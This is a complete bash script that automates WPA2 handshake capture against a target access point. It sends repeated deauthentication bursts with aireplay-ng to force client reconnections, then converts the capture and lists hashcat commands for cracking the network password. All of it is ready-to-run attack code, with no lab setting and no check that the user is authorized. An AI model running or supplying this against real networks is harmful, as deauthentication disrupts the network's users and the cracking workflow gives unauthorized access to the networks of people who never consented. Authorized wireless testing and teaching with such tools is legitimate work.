#!/bin/bash
# handshake-capture.sh - Automated WPA2 handshake capture
# Usage: sudo ./handshake-capture.sh <bssid> <channel> [interface]

set -e

BSSID=$1
CHANNEL=$2
INTERFACE=${3:-wlan0mon}
OUTPUT="handshake-${BSSID//:/-}"

print_usage() {
    echo "Usage: sudo $0 <BSSID> <CHANNEL> [INTERFACE]"
    echo "Example: sudo $0 AA:BB:CC:DD:EE:FF 6 wlan0mon"
    echo ""
    echo "Prerequisites:"
    echo "  - Wireless adapter in monitor mode"
    echo "  - aircrack-ng suite installed"
    echo "  - Target has active clients"
}

check_prerequisites() {
    if [ $# -lt 2 ]; then
        print_usage
        exit 1
    fi
    
    if [ "$EUID" -ne 0 ]; then
        echo "[!] Must run as root"
        exit 1
    fi
    
    if ! command -v airodump-ng &> /dev/null; then
        echo "[!] aircrack-ng not installed"
        exit 1
    fi
}

check_monitor_mode() {
    if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo "[!] $INTERFACE not in monitor mode"
        echo "[+] Run: sudo airmon-ng start ${INTERFACE%mon}"
        exit 1
    fi
}

set_channel() {
    echo "[+] Setting channel $CHANNEL"
    iwconfig "$INTERFACE" channel "$CHANNEL" 2>/dev/null || \
    iw dev "$INTERFACE" set channel "$CHANNEL" 2>/dev/null || true
}

capture_handshake() {
    echo "[+] Starting capture for BSSID: $BSSID"
    echo "[+] Output: $OUTPUT-01.cap"
    echo "[+] Press Ctrl+C to stop early (if handshake captured)"
    echo ""
    
    # Start airodump-ng in background
    airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$INTERFACE" &
    AIRODUMP_PID=$!
    
    # Wait for airodump to initialize
    sleep 5
    
    # Attempt deauth bursts
    local burst_count=0
    local max_bursts=15
    
    while [ $burst_count -lt $max_bursts ]; do
        burst_count=$((burst_count + 1))
        echo "[+] Deauth burst $burst_count/$max_bursts..."
        
        # Send 3 deauth frames
        aireplay-ng -0 3 -a "$BSSID" "$INTERFACE" 2>/dev/null || true
        
        # Wait 20 seconds for reconnection
        sleep 20
        
        # Check for handshake
        if verify_handshake_quiet; then
            echo ""
            echo "[+] SUCCESS: Handshake captured!"
            kill $AIRODUMP_PID 2>/dev/null || true
            wait $AIRODUMP_PID 2>/dev/null || true
            return 0
        fi
    done
    
    # Timeout reached
    echo ""
    echo "[!] Handshake capture timed out"
    kill $AIRODUMP_PID 2>/dev/null || true
    wait $AIRODUMP_PID 2>/dev/null || true
    return 1
}

verify_handshake_quiet() {
    if [ ! -f "${OUTPUT}-01.cap" ]; then
        return 1
    fi
    
    aircrack-ng "${OUTPUT}-01.cap" 2>&1 | grep -q "handshake"
}

verify_and_convert() {
    echo ""
    echo "[+] Verifying capture..."
    
    if ! verify_handshake_quiet; then
        echo "[!] No handshake found in capture"
        echo "[!] Possible causes:"
        echo "    - No clients connected"
        echo "    - 802.11w (MFP) enabled"
        echo "    - Target too far (weak signal)"
        echo "    - Channel interference"
        return 1
    fi
    
    echo "[+] Handshake verified in: ${OUTPUT}-01.cap"
    
    # Show capture info
    aircrack-ng "${OUTPUT}-01.cap" 2>&1 | grep -E "(BSSID|ESSID|WPA)"
    
    # Convert to modern format if hcxpcapngtool available
    if command -v hcxpcapngtool &> /dev/null; then
        echo ""
        echo "[+] Converting to hashcat format..."
        hcxpcapngtool -o "${OUTPUT}.hc22000" "${OUTPUT}-01.cap" 2>/dev/null && \
        echo "[+] Hash file: ${OUTPUT}.hc22000 (hashcat mode 22000)" || \
        echo "[!] Conversion failed (may need valid handshake)"
    fi
    
    return 0
}

print_next_steps() {
    echo ""
    echo "=========================================="
    echo "  Next Steps"
    echo "=========================================="
    echo ""
    echo "1. Verify handshake quality:"
    echo "   aircrack-ng ${OUTPUT}-01.cap"
    echo ""
    echo "2. Convert for hashcat:"
    echo "   hcxpcapngtool -o hash.hc22000 ${OUTPUT}-01.cap"
    echo ""
    echo "3. Crack with hashcat:"
    echo "   hashcat -a 0 -m 22000 ${OUTPUT}.hc22000 wordlist.txt"
}

main() {
    check_prerequisites "$@"
    check_monitor_mode
    set_channel
    
    echo "=========================================="
    echo "  WPA2 Handshake Capture"
    echo "=========================================="
    echo "Target: $BSSID"
    echo "Channel: $CHANNEL"
    echo "Interface: $INTERFACE"
    echo ""
    
    if capture_handshake; then
        verify_and_convert
        print_next_steps
    else
        verify_and_convert || true
        echo ""
        echo "[!] Capture incomplete. Troubleshooting:"
        echo "    1. Verify clients are connected: airodump-ng -c $CHANNEL --bssid $BSSID $INTERFACE"
        echo "    2. Check for 802.11w: Look for 'MFP' in airodump-ng output"
        echo "    3. Improve signal: Move closer to target"
        echo "    4. Try passive capture: Wait for natural reconnections"
    fi
}

trap 'echo ""; echo "[!] Interrupted by user"; exit 130' INT

main "$@"
